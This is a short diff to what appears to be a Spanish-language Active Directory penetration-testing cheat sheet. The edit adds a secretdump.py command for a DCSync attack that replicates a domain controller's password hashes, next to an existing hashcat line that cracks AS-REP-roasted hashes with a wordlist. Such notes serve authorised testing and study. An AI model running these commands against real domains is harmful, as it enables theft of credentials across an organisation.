@@ -478,7 +478,7 @@ hashcat -m 18200 --force -a 0 hashes.asreproast rockyou.txt
 
 El ataque DCSync consiste en "Simular" ser un Domain Controller, con ello, intentamos replicar los hashes de un Domain Controller ya existente.
 
-``
+`python3 secretdump.py 'domain\user:password@ip'`  # el usuario tiene que tener el privilegio de replicar un controlador de dominio
 
 ## Kerberoasting
 
